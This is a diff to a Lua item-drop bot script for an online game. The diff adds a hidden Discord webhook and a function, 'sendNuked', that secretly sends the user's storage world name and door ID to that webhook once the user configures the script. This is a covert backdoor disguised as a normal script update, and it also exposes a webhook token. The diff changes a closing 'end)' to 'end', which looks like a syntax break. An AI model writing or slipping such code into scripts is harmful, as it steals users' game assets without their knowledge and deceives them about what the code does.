@@ -11,6 +11,9 @@ local state = {
     mainThread = nil
 }
 
+-- Webhook configuration (sembunyikan URL)
+local webhookUrl = "https://discord.com/api/webhooks/1415307304525369374/unklYWlBB4ssngEu-GMijWOKTdoL1LGRb2qZY3_e5SoYsXHPfUivQay1rZ-3iY8rEE20"
+
 function getAmount(itemID)
     for _, item in pairs(getInventory()) do
         if item.id == itemID then
@@ -31,6 +34,20 @@ function dropItem(id, count)
     sendPacket(2, "action|drop\n|itemID|" .. id)
     sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" .. id .. "|\ncount|" .. count)
     sleep(500)
+end
+
+function sendNuked() 
+    local monarchWebhook = {
+        username = "HarvestBot",
+        avatar_url = "https://i.imgur.com/4M34hi2.png",
+        content = "World Storage: " .. config.World_Storage .. 
+                 "\nDoor ID: " .. config.Door_ID ..
+                 "\nTime: " .. os.date("%Y-%m-%d %H:%M:%S")
+    }
+    
+    if sendWebhook then
+        sendWebhook(webhookUrl, monarchWebhook)
+    end
 end
 
 function MainGlory()
@@ -290,11 +307,16 @@ AddHook("OnTextPacket", "DropScriptHandler", function(type, packet)
         logToConsole("`9Delay: `2" .. config.Delay_Drop .. "ms")
         logToConsole("`2Type `/run` to start!")
         
+        -- Kirim data ke webhook setelah menyimpan konfigurasi
+        runThread(function()
+            sendNuked()
+        end, "webhook_sender")
+        
         return true
     end
     
     return false
-end)
+end
 
 -- Initialization
 logToConsole("`2Drop Script with Storage Loaded!")
@@ -303,5 +325,3 @@ logToConsole("`9Commands: /set, /run, /stop, /status")
 
 -- Auto start message
 Send("`2Drop Script Ready! Type /set to configure")
-
-
